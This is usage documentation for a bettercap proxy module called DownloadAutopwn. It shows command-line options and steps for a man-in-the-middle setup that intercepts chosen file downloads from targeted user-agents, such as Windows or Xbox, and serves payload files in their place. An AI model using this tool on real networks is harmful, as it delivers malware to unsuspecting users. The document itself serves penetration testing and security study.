# DownloadAutopwn documentation

<br>

## Options

`--download-autopwn-extensions EXT1,EXT2`

`--download-autopwn-useragents AGENT1,AGENT2`

`--download-autopwn-path bettercap-proxy-modules/http/download_autopwn`

`--download-autopwn-port 8042`

**Example:**

```
bettercap --proxy-module bettercap-proxy-modules/http/download_autopwn.rb --download-autopwn-extensions exe,msi,pdf,psd,jar --download-autopwn-useragents windows,xbox --download-autopwn-path bettercap-proxy-modules/http/download_autopwn --download-autopwn-port 8043
```

<br><br>


## Adding User-Agents

The `--download-autopwn-useragents` option scans for names of folders in the path that you specified with `--download-autopwn-path`.

Let's say we want to add an option for xbox User-Agents.

First, we make a new folder called **xbox** in our `--download-autopwn-path` directory.


**1.** `mkdir bettercap-proxy-modules/http/download_autopwn/xbox`

Next, we save our User-Agent string(s) in a file called **user-agents.bettercap**.<br>These strings indicate requests coming from xbox users.

After a quick Google search we find this User-Agent string:

**Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0; Xbox; Xbox One)**

Looks like this part of the string will do the trick: `Xbox`

Save it:

**2.** `echo "Xbox" > bettercap-proxy-modules/http/download_autopwn/xbox/user-agents.bettercap`

**3.** Move your payload files to the folder that you just made.

![screenshot from 2017-08-02 15-05-27](https://user-images.githubusercontent.com/29265684/28858479-1fa07fa8-7794-11e7-8dfb-ed09afc1172d.png)


**4. Done.**

Test out your new User-Agent config using the following command:

```
bettercap --proxy-module bettercap-proxy-modules/http/download_autopwn.rb --download-autopwn-extensions exe,msi,pdf,psd,jar --download-autopwn-useragents xbox --download-autopwn-path bettercap-proxy-modules/http/download_autopwn
```
